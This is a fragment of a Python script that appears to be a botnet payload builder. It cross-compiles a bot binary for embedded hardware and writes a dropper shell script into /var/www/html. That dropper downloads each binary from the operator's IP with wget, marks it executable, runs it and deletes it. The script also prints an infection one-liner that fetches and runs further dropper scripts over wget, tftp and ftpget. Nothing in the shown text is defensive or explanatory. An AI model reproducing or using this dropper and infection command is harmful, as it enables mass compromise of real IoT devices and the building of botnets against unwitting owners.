...
run("./cross-compiler-powerpc-440fp/bin/powerpc-440fp-gcc -static -pthread -D POWERPC-440FP -o " + compileas[13] + " " + bot + " > /dev/null")
...
run('echo -e "#!/bin/bash" > /var/www/html/SSP.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/SSP.sh')
...
print("\x1b[0;32mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/SSP.sh; chmod 777 SSP.sh; sh SSP.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh\x1b[0m")
print